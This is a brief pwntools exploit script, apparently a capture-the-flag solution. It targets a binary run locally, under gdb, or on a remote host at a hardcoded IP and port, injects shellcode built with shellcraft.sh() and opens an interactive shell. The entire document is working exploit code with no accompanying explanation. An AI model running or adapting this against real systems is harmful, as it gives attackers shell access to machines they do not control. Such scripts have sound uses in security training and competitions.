from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x40101b
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.28.147.7',5000)
    else:
        return process(e.path)

p = start()

chain = asm(shellcraft.sh())

p.sendline(chain)

p.interactive()
